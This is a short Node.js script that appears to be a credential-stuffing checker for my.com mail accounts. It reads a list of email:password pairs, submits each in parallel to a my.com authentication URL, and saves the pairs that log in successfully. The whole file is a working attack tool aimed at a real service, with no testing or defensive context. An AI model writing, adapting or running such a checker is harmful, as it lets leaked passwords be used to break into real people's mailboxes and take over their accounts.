(async()=>{
    "use strict";

    // Dependencies
    const { runJobs } = require("parallel-park")
    const request = require("request-async")
    const fs = require("fs")
    
    // Variables
    const args = process.argv.slice(2)
    const valid = []
    
    // Main
    if(!args.length) return console.log("usage: node index.js <input> <output>")
    if(!args[1]) return console.log("output is invalid.")
    
    const accounts = fs.readFileSync(args[0], "utf8").replace(/\r/g, "").split("\n").filter((account)=>account)
    
    await runJobs(
        accounts,
        async(account)=>{
            account = account.split(":")

            var response = await request(`https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=${account[0]}&password=${account[1]}`)
            response = response.body

            if(response === "Ok=1") valid.push(account.join(":"))
        }
    )

    if(!valid.length) return console.log("No valid mail found.")

    fs.writeFileSync(args[1], valid.join("\n"), "utf8")

    console.log("Finished.")
})()